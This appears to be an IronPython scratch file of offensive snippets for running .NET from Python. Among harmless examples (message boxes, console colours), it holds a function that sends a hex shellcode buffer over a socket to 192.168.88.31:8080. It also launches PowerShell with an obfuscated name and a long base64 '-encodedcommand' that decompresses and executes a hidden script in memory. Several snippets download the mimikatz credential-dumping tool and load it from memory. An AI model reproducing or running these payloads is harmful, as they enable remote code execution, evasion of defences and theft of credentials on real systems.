﻿import clr, sys

# load from zip
#sys.path.append(r"C:\IronPython-2.7.7\Lib.zip\Lib")
#sys.path=[]
#sys.path.append(r"C:\Python27\Lib")
#sys.path.append(r"C:\Python27\Lib\site-packages")
#sys.path.append(r"C:\Users\dimas\Downloads\dist\dist.zip")
print sys.path

#import traceback, os


#import ctypes
#buffer = ctypes.create_string_buffer(100)
#ctypes.windll.kernel32.GetWindowsDirectoryA(buffer, len(buffer))
#print buffer.value




""" clr.AddReference("System.Windows.Forms")

from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")

from System.Threading import Thread, ThreadStart
def f():
   Thread.Sleep(1000)
   print "Thread Finished"

f()
"""


>>> import clr
..> clr.AddReference("System.Windows.Forms")
..> from System.Windows.Forms import MessageBox
..> MessageBox.Show("Hello World")
..> END



import clr
clr.AddReference("System")
from System import Console, ConsoleColor
Console.ForegroundColor = ConsoleColor.Red;
Console.WriteLine("Red.");
Console.WriteLine("Another line."); # <-- This line is still white on blue.
Console.ResetColor();




"""
try:
   sys.platform="win32"
   os.environ['TERM'] = 'dumb'
   from prompt_toolkit import prompt
except Exception as e:
   traceback.print_exc(file=sys.stdout)

"""


print "here"

try:
    import socket
except Exception as e:
    print e


from System.Threading import Thread, ThreadStart


def scode():
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.88.31", 8080))

  buf =  ""
  buf += "\xdb\xc3\xbd\x9c\xec\x7c\x70\xd9\x74\x24\xf4\x5a\x31"
  buf += "\xc9\xb1\x89\x31\x6a\x17\x03\x6a\x17\x83\x76\x10\x9e"
  buf += "\x85\x5d\x36\xe2\xbc\xbe\xe4\x03\x98\x34\xd3\xcf\x45"
  buf += "\x87\xd2\x81\xf8\xd6\x8b\xf9\x7f\xdf\x50\xf9\x10\x11"
  buf += "\x65\x25\x48\x6d\xdb\x36\x0c\xab\x64\x85\x7e\xe1\x8d"
  buf += "\x16\x2b\xd6\xee\xb1\x63\xd5\xd0\x94\x75\x24\x90\x6b"
  buf += "\x00\x8b\x52\x5f\x0a\xe4\x1a\x50\x79\x8a\xdd\xe3\x37"
  buf += "\xf2\x21\x75\x3b\x01\x95\x7d\x59\x5d\xcb\x5a\xe8\x29"
  buf += "\xe9\xd3\xd6\xea\x8f\x2e\xfb\x58\x18\x4d\x59\xfb\x30"
  buf += "\xcd\x0f\xba\x9c\x2e\x47\x3e\xda\x04\x36\xa5\xcf\xb3"
  buf += "\x60\x9e\x54\x2e\x49\x05\x5e\x38\x76\xd8\x4c\x3c\x50"
  buf += "\x47\x40\x56\x13\xea\x29\x40\x2b\x92\x8d\xa1\x8d\x7a"
  buf += "\x59\x20\xba\x5a\x75\x9d\xec\xa9\x07\xdc\x50\x25\x25"
  buf += "\x99\xfa\x0b\x01\xfc\x3d\xbc\xe4\x6c\xcd\xad\x2a\xac"
  buf += "\xaa\xb7\xec\x28\x55\x2e\x30\x0a\xb6\xc3\x11\xb8\xe8"
  buf += "\x04\x29\x61\x68\xc0\xfb\xe4\x48\xf2\x23\x04\x73\x05"
  buf += "\x3d\x7e\x88\xaf\xfa\x62\x7d\x31\xff\x72\xe8\xff\x26"
  buf += "\xe3\x2b\x8b\xd3\x6c\xb8\xba\x61\x3d\xf7\x8a\x9e\xb9"
  buf += "\x4a\x39\x6f\x61\x9c\x0d\x3a\x70\x25\xb5\xc8\xc3\x8b"
  buf += "\x4a\xcd\x43\xea\x22\x91\xba\x8a\x6b\x17\x46\x8b\x84"
  buf += "\x46\xc6\x9e\x04\x3f\x3b\x62\x28\x52\xb0\xd9\xca\x1d"
  buf += "\x19\x53\xfb\x0a\x97\xa9\x8f\x98\xbd\x3f\x6c\x7b\x43"
  buf += "\xe0\x67\xe3\x35\xd0\x8d\xdd\x59\xf0\xef\xf8\x6b\x83"
  buf += "\x44\x1d\xd8\x28\xc4\xd6\x14\xee\xde\xbe\x8b\x8a\xb6"
  buf += "\x9e\xb1\xa4\x1d\x95\x88\x44\x2a\xc3\x71\x77\x27\xa2"
  buf += "\xba\x66\xab\x2e\x00\x4b\xf2\x55\x8a\x69\xbe\x22\xb7"
  buf += "\x47\x4e\xc5\xfe\x18\x74\xb5\xc5\x39\x4b\xf5\x0a\x90"
  buf += "\xb5\x14\xf7\x9e\xc0\x05\x93\xb3\xd3\x80\x09\x14\x08"
  buf += "\x43\xf9\x12\xf4\x57\x7d\x08\x9c\xe2\xe9\x9f\x4a\xe7"
  buf += "\x5e\x7a\xe5\xf6\xa9\x3f\x93\xdc\xe9\xb1\xcd\x8b\x35"
  buf += "\xb8\x3b\x97\x1d\xd7\xc4\x76\x91\x1a\x20\xbf\x3e\xe1"
  buf += "\x45\x8a\x1f\xc4\xb6\x10\x88\xff\x47\x52\x7e\x75\x8b"
  buf += "\x24\xaa\x86\x55\xa0\x17\xff\x75\x10\x67\xbf\xdf\x5e"
  buf += "\xe5\xe5\x07\x09\x73\x66\x19\x87\xc4\x6b\x33\x01\xc6"
  buf += "\x54\x69\xba\x46\xdb\xb2\x87\x11\x51\x96\xd1\x33\x2b"
  buf += "\xa9\xb5\xd6\xcc\x21\x16\xc9\xa8\xf8\x8c\x75\x07\xa0"
  buf += "\x64\x9e\xb1\xad\x3a\xc5\xdb\x12\xcc\xf9\xba\x53\x07"
  buf += "\xe0\x33\xc2\x47\x4f\xa5\x57\xce\xf2\x35\xbc\xa5\xc1"
  buf += "\x85\xdd\xac\x15\x13\xc5\x39\x79\x06\x36\x08\xfd\xa6"
  buf += "\x41\x7a\xf3\xc9\x40\x60\x8d\x72\x24\x0c\x83\xf8\x1d"
  buf += "\x7a\x89\x79\xe9\xe6\x4d\x96\xd6\xe8\x22\x02\x21\xcd"
  buf += "\x18\x2c\x21\x6d\x85\xa1\xa0\xcb\x88\xfd\x01\x0d\x7b"
  buf += "\xdc\x3a\x3f\x58\xec\x00\x16\x38\x52\x32\xb2\x79\xb4"
  buf += "\x39\x23\x2f\xae\xbe\x29\xd3\x63\xb1\xc6\xb5\xf9"


  sock.send(buf)
  sock.close()

scode()
"""
try:
    from System.Diagnostics import Process
    #Process.Start('powershell.exe', '')
except Exception as e:
    traceback.print_exc(file=sys.stdout)

p = Process()
p.StartInfo.UseShellExecute = False
p.StartInfo.RedirectStandardOutput = True
p.StartInfo.FileName = 'pOwersHell.exE'
p.StartInfo.Arguments = " -nop -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMADEAWABlADIAKwBpAFMAaAB2AC8AdQAzADQASwBjAHQASgBFAFQAYQAwAEkAVwBxAHUAYgBOAE4AbgBCAEsAMQBiAFUAZwBrAEIAcgBUADkATwBNAE0ARgB6AHMAeQBDAEEATQBLAHAANwBkADcALwA0AE8AcQBMAHYAZABkADcAdgBuADMAWgBPAFQAdgBDAFEAawBjADMAbAB1ADgAMwBzAHUAOAA0AHkARwA2AEwAVgBHAEkAOQArAGkAQwByAEUAUgBkADIAMgBnAEsAUABaAEoAdwBJAG0ARgB3AG0AVwBYAHkASgBTADcANAB6ADQAWABDADAANABTAFcARABSAGIAegBnAGEAdgBMAHEASwB2AFkAVQBTAHMAVgAyAGoAYgBFAFkAcABqADcAcQAvAEMAeABRAHgARwBjAE0AMgBWAEwAcgBjAHcAZQBsADAAVABPADgARwBvAHcAdQBXAFQAagBCAEQAWgBTAFkAVABLAEYAeABlAEYAaQAzAHcAcABDAFcATABvAG8ATgBjAEEAVQBuACsATABYAHQAZQBJAGUAcwBTAE8AbQBhAEwAUwBNAHcAagBEAEwAbABsAEQAUAAzAGoANQA5AEsAbQBUAFIAQgBFAEsANgBIAEYAZQBIAFMAQQBLADQAaABpAHQAbAA5AGgASABjAGEAbgBNAGYAZQBGAE0ARAAwAFgAbwBlAHIAcABjAEkAWQB0AHkAZgAzAEcAWAByADkAVQBCAEoAawB1AEkAVAAyAFIAcABCADEAbwBlAE8AeABBAEkANwBHAHgAdgBUAEMAeQBZAG4AYQBDAHEAaABkAGkAbgBwAGUASwBmAGYAeABiAEwAegA5AGYAQwBTADcAVwAzAFMAUwBDAE8AUwAwAFUAdABqAFMAbABhAFYAMgAyAE0AaQAyAFgAdQBhAHoAbABUAE8ARQA5AEQAVgBDAG8AcQB2AGgAVwBSAG0ARABpADAAYQB2AHAAQgBYAGEAegBxAHUAZgBXAFQAMwBIAGoAbABhAEgAdQB4AFgARwBCAG4AaQB4AEIATgBvAG8ARAA3ADkAUgBFAHoAbQBVAGUATwBVAHAARQBOAFoAdwB3AFoAYwBFAFMAdwBXAEsANwBLAHcAWgBhADgAbwBkAEoAbABrAEcAQgBjADQAVAA2AFgAbgBrADgARwBxAFUAbABBAC8AVABWAGkAKwB4AFIARgBKAE4AUgBRAHQAUABVAHQARgBGAGUASABNAEwAQQB4AFUAcABIAHoAVQBwAHEAZwAzAFIAbQBIADMAMgBVAHEAdgBXAGQAaQBWAEQATQBhAGwAUwBzAG4AOQAvADIATwA3AFUAcgB1ADQAcQBPADQAWQB2AGwAbgA2ADkALwBGAFEAWgBsADkAUAA4AFYAQwB1AGYAQwAxADgARQBGAFUAMgBRAGcAagBGADEATAAwAFMAaABuADAANwA4AEsAcQBjAEgASAB4AG4AQQA4AFIATwAwADkAcABSAG0ASQAvADUANwB2AGoAYQBoAFYATwBZAFUAWgBBAFMAcQBLAFUAVABTAC8AbgBVAFkATABLAEwAOQB4AHoANQByAHIAbgBsADUAZQBUADIAagBOAG4AWABQAG0AbABJAE8ASABNAGQAZQBJADUATwB2AE4AbwB4AHgAMwAzAGIAQgBEAGYAZgBpAGwAYwA1AEgANwBPADkANwBPAE4AMQAyAFgAaQBZAHgAdABGAEcAYwBHAHYASQA3AGUATABIAEQAOQBBADMAVABTAEEAYQA5ADgANgBCADIAZgBwAEkANgBjAGgAQgA2AE0AYwBrAE8AcQBaAGIATQBJAE0ATABSAFYAUABHADgAagB1AG4AdQBBAHAAWgBvAGcAKwAvADgAegBXAFcALwB2ADAARwA2ADkAMABOAEEANQBZAHoAUABFAHgAcwA0AHIARgBSAFAAbABIAFkANAA1AE8ATABCAFgAbABRAEUARgByAEIAdQBCAHgAWABtAFQATwBjAGwAaABLAG8ARABQADEASwBRADMAUwBzAC8AWgBzAHoAbwBpAEsASABRAHoAagB1AE0ATABOAEUAcABhAFQAVgBvAFgAVABFAE0AVABJAHIAbgBBAGcAaQBQADMAVABGAGsAZwBvAHkAWQBmAEYANwArAFkAcQBDAGEAYQArAEIAVwBOADYARgB2AGQAUwAvAGcARABTAGsAKwBvAE8AQwBXAEkAYQBKAFIAWgB6AEwANABOAGgAcgBvAFgASQA4AGkASABPAFUASwBsAHcAUQA5ADkARwBVAHEAcgA1ADcAdABtAEUANABvAGUAWQBkAEMARABHAGYAdQBBAHkAUwBWAHYAbQBFADcAYQBTAFkAYQBIAFIATABHAGcAaQB1AC8ATABmAEEAVgBLAHUAYQBvAGoASwA2AHgAQwBqAE4AYQBQAE8ASwAwAFkAZgBRADUAZgBWAGgAMQBOAEsANQBmAEUARwBYAFcAUQBYAC8AOABiAHMAYwA2AEkAYwBzAHkATABEADYAZwB6AFMATwA2AE4AWgBBAEcAaQBZADAAQQBwAG4AKwBCAEYAbABOAGEAaABZACsAUwBuAHkALwBxAFYANQBQADUAYQBrAEgAKwB6AHMAUgBPAGoAawB5AFYASwBlAGkAcwA5AFMAUwByAE8ARQB5AFMAbQB0ADcAQwBhADQAKwB3AFoAbQBEAGwAMQBFAEcAVwB6ADkAaQBLAHcAbABHAEsATgBtAEkANwBzAHkAQQByAGYAMABCAHoALwAxAFIANABCADkAVAAzAEsAQQBGAFgAdgAwADUAZwB2AHkAagB2ADAASwArADMAVwAvAEwAcABQAHUAcgBYADAALwBXAGcAMQA1AHgAZQByAEUAcwAwAEcALwBCAGYAeQBkAHUANwBOAGEARQAyAEEANQBmAHEAcwAvAGUAbQBSADAARAAzADUATgBiAGcARwA3AE0AMwA0AFkAKwB2ADMAZABVAEwAMABIAHQAcwBUAFcAMwBDAGQAZgBjAEYAMQBnAHoAMQBhAHoAMwBuAG8AOABrAFcATgBKAE8ATQBrADUAOABsAHUATgB4AHYAQwB4AEIAdQByADEAeAByAFIAZQBlADcAUABSAEsASwBOAC8AQQAvAFoAawA3AGUALwAyAFkAegBaAG0AdABYAFUANgBsAGgAaABmAFQAYwBhADkAVQBVAGQAZABtAG0ASgAvAFkAZQBJAGgAMwArAGgANwBqAGsAbABpAHIAZABsAFkAMgBIAEIAdwBnADIAMABnAEUAVgB2AEUAQwBUAFIAVQBNAGgAOQBhAGEANABuAG4AagBTAGIASQB2AHoAMAB2ADIASQA4AEcAKwAyAEUAMwBOAEIARgAwAGUAQQBHAHQAMwA3AEkATgA4AHoAQQBjADYAVQBaAC8AQQA0AFMAKwBDAHMAZQB4AEIASQBBADAAMQB3AGYAZQBvADcALwBnAEIAMwB6AGIAZQBHAGcAKwA3AFIAaQBWAHQARwBTAFkAYQBCAEMAQQBsAE0AaQBxAHAAdQBQAFIAWABNAGMAUwBhAFEAcAA2AE0AbQBVADYAVwBCAFoAMABkADQASgBFADMASwA0AEMAZwBCAHkANAAwAEYAVQBmAG8ATgBjADIANABkAEEAWQBCAEcAVABKAEMAMABZAHIAMQB3ACsAMwA3AGIAbQB4AGQAcQBuAGsAZQBiAGQAOAAyACsAegB2AHcARgBVAHYAZABYAHMAQQBkAEkAZQA4ADUAeQB4AHEAawBoAHoAYwBOAEgAZQBZAGIATwBKAEgALwA5AEgASgA1AFAAYQBKAHEAdgBXAFIAdwBzAGEASwAwADMANgBFAHIAcQAwAGEAVABDADgAVgBIAEwAZgBEADkARwA1ADMAWQBNAHUATQB1ADkAbgBYADkAYQBIAFoANwA0AGEASQBaADkAOQBoAHkARABjAFgAUABYAGEATwBiAHAAZwArAE0ATgBsAFQAYgA1AHMAdABqADQAVQArAFYAZwBjAHkAQwBDAEEAYwBUAHYAYQBOAE8AUQBIADcAcQBXADIANwAvAGwANQBvADcASgBaAEIAcQBOAGsAQwBXAEwAUgBiAEwAUgBuAHUARgAwAGcAZABHADIAcABYAG4ATwB1AHoATgBMAFQASABxAHcAUgBlADMAYwA4AHQAQgBSAC8AUwAvAFoARABpAEkARgBaAHMAMwBjAEwAMgBRAFoANQA3AHQAUgBXAFoAQwBNADMANgBrADYAUgBMADkATgA2AEQAcQByAHAAQgBVAGYAMQBCAE0AaQB6AFIAUwBNAGQANgBQADEAaQBZAE4ANwBXAHAATAAwADIAVwA5AFQAQgBjAEQAdgBiAGUAKwBLAEEAbgBTAGcAYwBRAGcALwBsAG8ATQBXAGoAWAByAFYAUwBhAEcAaAAwAGcAagBsAGUAOQBXADMAawA0AEUAcQBlAHIAWABqAEwAVgAzAGwAeABWAE4ARgBaAFEAYgBHADIAVgBGAGQAZwByADMAZQB6AHYAdQBlAG8AYQBwAHcAdAB6AHMAVQBXAGQAVgBtADIAOABBAHAATwBPAEMAeABSAHYAdQA3AEMASAA5ADkATQBRAHoAWgBvAEwAWABqAGEARABkAG0AdAAyADYATQA0AEgAMAAyAFoANwBjAHQAagBnAEIAKwBsAHAAMgBoAG4AWAB0AEgAMQBnAGkAdABHAHEAUAB4AGcAMABKAGIAYgB2AFgAbwBXAEcATABEADQAOABOAEsATABXAGQAZwBhAGQAMwBWAEIAYgBCAEMATABRAEoAMgByAHIAYQBiAHIAVQAzAFIAWABSAGUAZQBEAFMAUQBkAEMANABOADgAUgBaAHYANwBaAFMAVQBtAG0AVgBKAHEATQBiAGcARABaAHUAeQBpADQAOQBhAFgATgByAEMAQQA2AHkAKwBTAFcAZgBTAEEATQB5AGkAYQBJAHUAWAB2AGUAcwBHAHcAZwBXAHQAQwA2ADAARgBrADMALwA0AFQARABaACsAcQBvAG0AdAB2AGYASQBuAEkANgA3AHUAOABPAFYAawBHAHoAMQAzAGwAeABVAHoAZQBuAGIAVwBFADMAcQB3AHMASQBYADAAbQBFAHQAYQB0AGIATgAwAGEASABSAHQAQwBYAHQANgBiADUAOQBIADkAZwBkAGQAMgBRACsAYgBiAG8AMwBSAGkAaABjAGUAUgB1AHQAMQA5AHAAbwAvAHMAQQBaAEQAWABpAHYATgA1ADMAdgBGAHoAMwBuAHYAdABHAGIANgAzAEsAcwB4ADcAWAB4AGYAaQBYADIAcgBsAHAAZQBoADIAeQBvAEIAZAB0AHkASgAyADMAYwBqAGkAWgBqAG8AaABzAEQAZAA3AFYAcABkADAAYgBSADAARgB5AHIAdQArAFYAVABtAEoAaQBEADIAMABtAHEAQQBEAGoAcgBDAEEAUwB6AFcARABSAEQAdwBPAEwANABnAGMAVQAwAFkAVAA4AEEAZgBaAHUAWQA5ACsAcgA4AGgAcwBYAFkAMgArADMAYgBNAFYAdABzAHIATwBxAE4ASQBEAEIARQBGADgAaABzAHEAZwBzAEwAMABnAHYAaABxAEwASABsAEQAYwArAFMAYQBuAHMAUwBEADQARQAxAFoAVABuACsAaQBFADEAbABSAG4AeQBuAHoAdgBQAGkAeABMAGYARQAvAGYAWgBKADcATQBmAGoAWQBCAEwAYQBBAHgAMABvAHkALwBIADIAWgBuAGQAMwA5AHcAYwByAFkAUgBlAEYAdgBDAEkAdABFADgAYwA1ADMAcgBQAC8AbwA4AEYAUgBZAEIAUgA3AEUATABOAGEAeABaAHEAVQA4AHcAMwBUAEoAMQBIAC8AMQBHAG8AdwByAFIAbABIAHEAZgBSAHgASQAvAHUARwBvAGcAQgBoADEAdQBTAHgATgB2AEIAYwBsAHcASABHAHgATQBxAGEAbwAxADkAMABLAGEAeABWAE8AegBaAFEATAArAHoAKwAwAGQAbQB3AEwAbgA0ADQASwBuAFAAZgBDAE0AdgBmAE8ANgBiAHoAMABxAGQAUABDADMAYQBRAFUAOABIAFAAQwBuAEIAMQBqAEEASwBYAGUAcABYAGEAdgBsADYAcgBzAFQAYQBuAHQAbQAvAFUAeQBvAFgAZgBQADMAKwBIAGgARwBuAHAAbQA3AFIASwAxAGkAbQA5AGcALwBLADkASQBwAHcAcgBLAGgAZQBPAFUASAB2AFUAWQAzAGUARAAvAFgALwBHACsAbgBRAGYANQBhAHIALwBPAGQAYgBmADEALwA1AG0AOQA3AGYAdwByADEAWABlAGcALwBUAFQANQBvADgATAAvADgAUQBkAC8AeAA0AGkARQAvAHEAVQBzAFcAcgBzADMAcwBYAG8AMgBEAG4AKwBMAGwASwBuAEEASAB6AFgAcAA3AC8AegBOAEkAcwB3ADUALwBSAGwAegA2AHAAcABRAHEAOABuAHIASQBzAHYARgBEADgAWABDAHIATABEAHYAVQBNAG8AOQBnAC8AcwBRAFkAVQAyAFgASwB1AGMAOQBlAFkAeABoAFIARwA5AFgAcABFAGwAZQAzADMAbABMAFUAcgBwAEUAcABZADUAdQBmAGYASQBYAFUATAB1AEsAMwBmAE4AUQBBAEYAeABYAFcAUgBQAHMATQBoAE4AcwBuADYARgBPADcANABvAHYAMwBBADcAZABwAFMAYwA4AFEAdQBuAEkAZwB1AHgAWgA4AGIAMQBpAEMAeABaAEgANABKAFkAMgA1AG0ASgB6AG8AVgBrAHgARwB6AHQAUAAyAG4AbQBRAG4AaQBpAEQAZwBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=";
p.Start()
p.WaitForExit() 
"""

## .Net via Py
import sys, clr
clr.AddReference("System")
clr.AddReference("System.IO")
from System import Console
from System.IO import Path
print(Path.GetFileName("C:\\file"))



## Bring in STDLIB
>>> import sys
>>> sys.path.append("C:\IronPython-2.7.7\LibR.docx")
>>> import os


## Launching external process
from System.Diagnostics import Process
Process.Start('powershell.exe', '')


## Download of file over TLS

from System.Net import WebClient
wc = WebClient()
from System.Net import ServicePointManager, SecurityProtocolType
ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
wc.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip", "mimikatz.zip")


import clr
from System.Net import WebClient
from System.Net import ServicePointManager, SecurityProtocolType
with WebClient() as wc:
        ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
        wc.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip", "mimikatz.zip")

wc.DownloadData("url")
from System.IO import MemoryStream
clr.AddReference("System.IO.Compression")
from System.IO.Compression import ZipArchive, ZipArchiveMode

zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip")
zipdata = MemoryStream(zip)

archive = ZipArchive(zipdata, ZipArchiveMode.Read)
print(archive)
<System.IO.Compression.ZipArchive object at 0x000000000000002B [System.IO.Compression.ZipArchive]>

